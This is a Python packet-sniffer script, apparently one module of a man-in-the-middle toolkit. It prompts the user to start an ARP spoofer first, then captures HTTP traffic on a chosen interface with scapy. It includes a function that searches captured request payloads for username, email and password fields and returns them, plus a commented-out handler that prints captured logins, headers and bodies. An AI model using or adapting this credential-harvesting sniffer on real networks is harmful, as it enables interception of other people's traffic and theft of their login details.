import time
from colorama import Fore
from colorama import Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re
import requests


choice = "Y"


def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ipconfig", "/all"], shell=True)
        output = output.decode("utf-8")
        # Extract MAC address using regex
        mac_search = re.search(r"({}[\s\S]*?Physical Address[\s\S]*?[\r\n].*?[\r\n])".format(interface), output, re.IGNORECASE)
        if mac_search:
            mac_address = re.search(r"(([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2}))", mac_search.group(1)).group(1)
            return mac_address
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Error: {e}")
    return None

def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ipconfig", "/all"], shell=True)
        output = output.decode("utf-8")
        # Extract IP address using regex
        ip_search = re.search(r"({}[\s\S]*?IPv4 Address[\s\S]*?[\r\n].*?[\r\n])".format(interface), output, re.IGNORECASE)
        if ip_search:
            ip_address = re.search(r"(\d+\.\d+\.\d+\.\d+)", ip_search.group(1)).group(1)
            return ip_address
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Error: {e}")
    return None


def ip_table():
    # get all the interface details with psutil in a variable
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface', 'Mac Address', f'IP Address{Style.RESET_ALL}'])
    for k, v in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k, mac, ip])
        elif mac:
            t.add_row([k, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)


def sniff(interface):
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp port 80")


# def process_sniffed_packet(packet):
#     if packet.haslayer(http.HTTPRequest):
#         print("[+] HTTP REQUEST >>>>>")
#         url_extractor(packet)
#         login_info = get_login_info(packet)
#         if login_info:
#             print(f"{Fore.GREEN}[+] Username OR password is sent >>>> {login_info}{Style.RESET_ALL}")
#
#         # Extract and display HTTP headers
#         http_headers = {}
#         for k, v in packet[http.HTTPRequest].fields.items():
#             if k in ["Host", "User-Agent", "Referer", "Content-Type", "Content-Length"]:
#                 try:
#                     http_headers[k] = v.decode()
#                 except:
#                     http_headers[k] = str(v)
#         print(f"{Fore.BLUE}HTTP Headers:{Style.RESET_ALL}")
#         for k, v in http_headers.items():
#             print(f"{k}: {v}")
#
#         # Extract and display HTTP request body (if any)
#         if packet.haslayer(scapy.all.Raw):
#             http_body = packet[scapy.all.Raw].load.decode("utf-8", errors="ignore")
#             print(f"{Fore.MAGENTA}HTTP Body:{Style.RESET_ALL}\n{http_body}")


    # else:
    #     print("Packet does not have an HTTP layer.")
def generate_http_traffic(url="http://testhtml5.vulnweb.com/#/popular"):
    try:
        response = requests.get(url)
        response.raise_for_status()
        print(f"[+] GET request sent to {url}")
        print(f"[+] Response status code: {response.status_code}")
        print(f"[+] Response headers: {response.headers}")
        print(f"[+] Response content: {response.text[:100]}...")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(f"[+] HTTP Request: {packet[http.HTTPRequest].summary()}")
    else:
        print("Packet does not have an HTTP layer.")

def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        try:
            load = packet[scapy.all.Raw].load
            load_decode = load.decode("utf-8", errors="ignore")  # Ignore decoding errors
            keywords = ["username", "user", "email", "pass", "login", "password", "UserName", "Password"]
            for keyword in keywords:
                if keyword in load_decode:
                    return load_decode
        except UnicodeDecodeError:
            pass  # Ignore the decoding error and continue

def url_extractor(packet):
    # Get the IP layer of the packet
    ip_layer = packet.getlayer('IP')
    if ip_layer:
        ip_fields = ip_layer.fields
        # Get the HTTP layer of the packet
        http_layer = packet.getlayer('HTTPRequest')
        if http_layer:
            http_fields = http_layer.fields
            # Print them in a readable form
            print(ip_fields["src"], "just requested \n", http_fields["Method"].decode(), " ", http_fields["Host"].decode(), " ", http_fields["Path"].decode())
    else:
        print("Packet does not have an IP layer.")
    return

def raw_http_request(packet):
    httplayer = packet[http.HTTPRequest].fields
    print("-----------------***Raw HTTP Packet***-------------------")
    print("{:<8} {:<15}".format('Key', 'Label'))
    try:
        for k, v in httplayer.items():
            try:
                label = v.decode()
            except:
                pass
            print("{:<40} {:<15}".format(k, label))
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")
    print("---------------------------------------------------------")
    # TO PRINT A SOLE RAW PACKET UNCOMMENT THE BELOW LINE
    # print(httplayer)



def main_sniff():
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:
        global choice
        choice = input("[*] Do you want to print the raw Packet : Y/N : ")
        ip_table()
        interface = input("[*] Please enter the interface name : ")
        print("[*] Sniffing Packets...")
        sniff(interface)

        # Generate HTTP traffic
        generate_http_traffic()

        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)

main_sniff()